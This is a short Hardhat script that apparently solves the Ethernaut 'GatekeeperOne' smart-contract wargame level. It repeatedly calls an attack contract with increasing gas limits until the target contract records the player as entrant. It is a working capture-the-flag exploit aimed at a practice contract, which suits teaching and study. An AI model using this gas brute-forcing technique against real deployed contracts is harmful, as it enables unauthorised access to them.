import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x5E3d0fdE6f793B3115A9E7f5EBC195bbeeD35d6C"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x5Ffe31E4676D3466268e28a75E51d1eFa4298620"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("GatekeeperOne", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("GatekeeperOneAttack", ATTACK_ADDRESS, signer)

  let n = 50000

  while (await contract.entrant() == "0x0000000000000000000000000000000000000000") {
    try {
      await attackContract.attack({ gasLimit: n })
    } catch {
      n++
      console.log(n)
    }
  }

  console.log(await contract.entrant())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
